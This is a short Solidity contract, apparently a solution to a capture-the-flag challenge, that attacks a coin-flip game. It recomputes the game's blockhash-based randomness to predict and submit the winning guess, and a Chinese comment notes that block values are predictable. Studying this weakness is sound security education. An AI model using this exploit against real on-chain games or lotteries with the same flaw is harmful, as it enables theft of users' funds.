pragma solidity ^0.7.3;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;
    address CoinFlip;

    constructor(address _CoinFlip) {
        CoinFlip = _CoinFlip;
    }

    function attack() public {
        // 攻击手段为blockNumber是可以预测的
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ICoinFlipChallenge(CoinFlip).flip(side);
    }
}
